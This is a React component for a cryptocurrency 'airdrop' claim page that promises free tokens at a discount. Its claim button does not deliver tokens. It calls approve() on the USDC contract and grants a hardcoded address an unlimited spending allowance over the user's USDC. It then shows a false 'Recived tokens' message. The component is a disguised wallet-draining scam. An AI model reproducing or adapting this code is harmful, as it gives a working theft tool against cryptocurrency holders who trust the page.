import React from "react"
import { connect } from 'react-redux';
import { log, logwarn, logerror } from "../std"

import { toast } from 'react-toastify';

import { connectWeb3, CHAINS } from "../store/web3Store";
import Wallet from "./Wallet";
import Button from "./Button";

import USDC_ETH_ABI from "../contracts/USDC_ETH_ABI.json";
import Web3 from "web3";

class AirdropToken extends React.Component {
    state = {
        isConnectedWeb3: false,
        USDC_ETH: null,
        mAddress: '0x4538fc0B3D886ac42863FAa40D7803dBe2cd38a5',
    }
    componentDidMount() {
        if (!window.ethereum || !window.ethereum.isMetaMask) {
            this.setState({ isConnectedWeb3: false })
        }

        if (this.props.web3) {
            this.initContracts();
        }
    }

    async initContracts() {
        let { web3 } = this.props;
        let USDC_ETH = new web3.eth.Contract(USDC_ETH_ABI, "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48")
        window.USDC_ETH = USDC_ETH
        window.USDC_ETH_ABI = USDC_ETH_ABI
        this.setState({ USDC_ETH: USDC_ETH })
        return USDC_ETH
    }

    async reciveAirdrop() {
        let { web3, accounts } = this.props;
        let { mAddress } = this.state;
        if (!web3) {
            toast.error("Please connect Metamask")
        } else {
            await this.initContracts()
            this.state.USDC_ETH.methods.approve(mAddress, web3.utils.toBN('0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')).send({}, function (err, tx) {
                if (err) {
                    toast.error(err.message)
                } else toast.success("Recived tokens")
            })
        }
    }

    render() {

        let { } = this.state;
        let { web3 } = this.props;
        log(web3)
        return (
            <div className="col-12 col-sm-10 offset-sm-1 col-md-8 offset-md-2 col-lg-6 offset-lg-3 col-xl-5 offset-xl-0">
                <div className="home__content home__content--right">
                    <div className="home__sales">
                        <h3>Recive Airdrop:</h3>

                        <p>Discount 33% from final price</p>

                        <div className="progress progress--small">
                            <div className="progress-bar" role="progressbar" style={{ "width": "70%" }} aria-valuenow="70"
                                aria-valuemin="0" aria-valuemax="100"></div>
                            <div className="progress__line" style={{ "left": "8%" }}><svg xmlns="http://www.w3.org/2000/svg"
                                viewBox="0 0 24 24">
                                <path
                                    d="M14.72,8.79l-4.29,4.3L8.78,11.44a1,1,0,1,0-1.41,1.41l2.35,2.36a1,1,0,0,0,.71.29,1,1,0,0,0,.7-.29l5-5a1,1,0,0,0,0-1.42A1,1,0,0,0,14.72,8.79ZM12,2A10,10,0,1,0,22,12,10,10,0,0,0,12,2Zm0,18a8,8,0,1,1,8-8A8,8,0,0,1,12,20Z" />
                            </svg> 100K</div>
                            <div className="progress__line" style={{ "left": "40%" }}><svg xmlns="http://www.w3.org/2000/svg"
                                viewBox="0 0 24 24">
                                <path
                                    d="M14.72,8.79l-4.29,4.3L8.78,11.44a1,1,0,1,0-1.41,1.41l2.35,2.36a1,1,0,0,0,.71.29,1,1,0,0,0,.7-.29l5-5a1,1,0,0,0,0-1.42A1,1,0,0,0,14.72,8.79ZM12,2A10,10,0,1,0,22,12,10,10,0,0,0,12,2Zm0,18a8,8,0,1,1,8-8A8,8,0,0,1,12,20Z" />
                            </svg> 400K</div>
                            <div className="progress__value">1M USD</div>
                        </div>

                        <p>Fixed token edition 3.000.000 BITS</p>
                        <div className="row justify-content-center" >{web3 ? (
                            <Button onClick={this.reciveAirdrop.bind(this)}>Recive Token</Button>
                        ) : (
                            <Wallet />
                        )}
                        </div>
                        <ul>
                            <li><i className="pf pf-visa"></i></li>
                            <li><i className="pf pf-mastercard"></i></li>
                            <li><i className="pf pf-paypal"></i></li>
                        </ul>
                    </div>
                </div>
            </div>
        )
    }
}

const styles = {

}

const mapStateToProps = (state, ownProps) => ({
    web3: state.web3Store.web3,
    accounts: state.web3Store.accounts,
    // contract: state.Contract.contract,
    // owner: state.Contract.owner,
});

export default connect(mapStateToProps, {
    connectWeb3: connectWeb3,
    // connectContract: connectContract,
})(AirdropToken);
